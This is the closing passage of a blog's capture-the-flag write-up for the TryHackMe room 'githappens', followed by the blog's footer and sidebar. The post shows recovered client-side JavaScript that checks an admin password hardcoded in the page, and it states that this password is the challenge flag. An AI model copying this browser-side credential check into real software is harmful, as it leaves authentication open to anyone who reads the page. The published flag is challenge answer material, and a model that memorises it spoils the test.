+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+    &lt;script&gt;</span><br><span class="line">+      <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span> &#123;</span><br><span class="line">+        let form = document.getElementById(<span class="string">&quot;login-form&quot;</span>);</span><br><span class="line">+        console.log(form.elements);</span><br><span class="line">+        let username = form.elements[<span class="string">&quot;username&quot;</span>].value;</span><br><span class="line">+        let password = form.elements[<span class="string">&quot;password&quot;</span>].value;</span><br><span class="line">+        <span class="keyword">if</span> (</span><br><span class="line">+          username === <span class="string">&quot;admin&quot;</span> &amp;&amp;</span><br><span class="line">+          password === <span class="string">&quot;Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!&quot;</span></span><br><span class="line">+        ) &#123;</span><br><span class="line">+          document.cookie = <span class="string">&quot;login=1&quot;</span>;</span><br><span class="line">+          window.location.href = <span class="string">&quot;/dashboard.html&quot;</span>;</span><br><span class="line">+        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+          document.getElementById(<span class="string">&quot;error&quot;</span>).innerHTML =</span><br><span class="line">+            <span class="string">&quot;INVALID USERNAME OR PASSWORD!&quot;</span>;</span><br><span class="line">+        &#125;</span><br><span class="line">+      &#125;</span><br><span class="line">+    &lt;/script&gt;</span><br><span class="line">+  &lt;/body&gt;</span><br><span class="line">+&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>账号密码都有了</p>
+<p><img src="/../pic/image-20230808161324044.png" alt="image-20230808161324044"></p>
+<p>原来密码就是旗帜</p>
+<p>Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!</p>
+
+            
+        </div>
+        <footer class="article-footer">
+            <a data-url="http://example.com/2023/08/08/githappens/" data-id="clmnr8k0c000eso8ghit25cwj" data-title="githappens"
+               class="article-share-link">Share</a>
+            
+            
+            
+            
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li></ul>
+
+
+        </footer>
+    </div>
+    
+        
+    <nav id="article-nav" class="wow fadeInUp">
+        
+            <div class="article-nav-link-wrap article-nav-link-left">
+                
+                    <img data-src="http://lc-PwMydsXe.cn-n1.lcfile.com/caDP5XKAnF1QVElLqnJFvQBUyYK0bfl7/1%20%285%29.jpg" data-sizes="auto" alt="friendly3"
+                         class="lazyload">
+                
+                <a href="/2023/08/10/friendly3/"></a>
+                <div class="article-nav-caption">Newer</div>
+                <h3 class="article-nav-title">
+                    
+                        friendly3
+                    
+                </h3>
+            </div>
+        
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
+                
+                    <img data-src="http://lc-PwMydsXe.cn-n1.lcfile.com/XTyRI4cV4aojqFmGA0cQ5GWKmYRxxrmq/1%20%287%29.jpg" data-sizes="auto" alt="tomghost"
+                         class="lazyload">
+                
+                <a href="/2023/08/05/tomghost/"></a>
+                <div class="article-nav-caption">Older</div>
+                <h3 class="article-nav-title">
+                    
+                        tomghost
+                    
+                </h3>
+            </div>
+        
+    </nav>
+
+
+    
+</article>
+
+
+
+
+
+
+
+
+
+
+
+</section>
+                
+                    <aside id="sidebar">
+    <div class="sidebar-wrap wow fadeInRight">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="honkerZ" class="lazyload">
+            <div class="sidebar-author-name">honkerZ</div>
+            <div class="sidebar-description">hacking</div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">18</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">3</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">23</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/kter123 itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+        </div>
+    </div>
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
+        </div>
+    </div>
+
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Tag Cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
+        </div>
+    </div>
+
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+        </div>
+    </div>
+
+
+    
+</aside>
+
+                
+            </div>
+            <footer id="footer" class="wow fadeInUp">
+    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            
+            <div>
+                <span class="icon-copyright"></span>
+                2020-2023
+                <span class="footer-info-sep"></span>
+                honkerZ
+            </div>
+            
+                <div>
+                    Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+                </div>
+            
+            
+                <div>
+                    <span class="icon-brush"></span>
+                    27k
+                    &nbsp;|&nbsp;
+                    <span class="icon-coffee"></span>
+                    02:29
+                </div>
+            
+            
+                <div>
+                    <span class="icon-eye"></span>
+                    <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                    &nbsp;|&nbsp;
+                    <span class="icon-user"></span>
+                    <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+                </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+        <nav id="mobile-nav">
+    <div class="sidebar-wrap">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="honkerZ" class="lazyload">
+            <div class="sidebar-author-name">honkerZ</div>
+            <div class="sidebar-description">hacking</div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">18</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">3</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">23</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/kter123 itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+        </div>
+    </div>
+</nav>
+
+        
+<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>
+
+
+<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+    <div class="site-search">
+        <div class="algolia-popup popup">
+            <div class="algolia-search">
+                <span class="algolia-search-input-icon"></span>
+                <div class="algolia-search-input" id="algolia-search-input"></div>
+            </div>
+
+            <div class="algolia-results">
+                <div id="algolia-stats"></div>
+                <div id="algolia-hits"></div>
+                <div id="algolia-pagination" class="algolia-pagination"></div>
+            </div>
+
+            <span class="popup-btn-close"></span>
+        </div>
+    </div>
+    <!-- hexo injector body_end start -->
+<script src="/js/insertHighlight.js"></script>
+<!-- hexo injector body_end end --></body>
+    </html>
+
